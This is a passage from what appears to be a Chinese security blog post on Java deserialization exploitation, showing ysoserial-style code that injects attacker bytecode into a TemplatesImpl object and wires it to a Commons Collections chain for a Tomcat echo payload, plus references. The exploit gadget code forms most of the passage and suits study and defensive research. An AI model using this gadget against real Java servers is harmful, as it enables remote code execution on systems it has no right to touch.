class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">        clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">        CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">            classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>同理找个CC链做载体</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTomcatEchoImpl();</span><br></pre></td></tr></table></figure>

<p>实现效果</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1625539806921.png"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://xz.aliyun.com/t/7535">https://xz.aliyun.com/t/7535</a></p>
<p><a href="https://paper.seebug.org/1181/#request">https://paper.seebug.org/1181/#request</a></p>
<p><a href="http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/">http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/</a></p>
<p><a href="https://xz.aliyun.com/t/6227">https://xz.aliyun.com/t/6227</a></p>
]]></content>
      <categories>
        <category>摸鱼记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
        <tag>摸鱼记</tag>
      </tags>
  </entry>
</search>
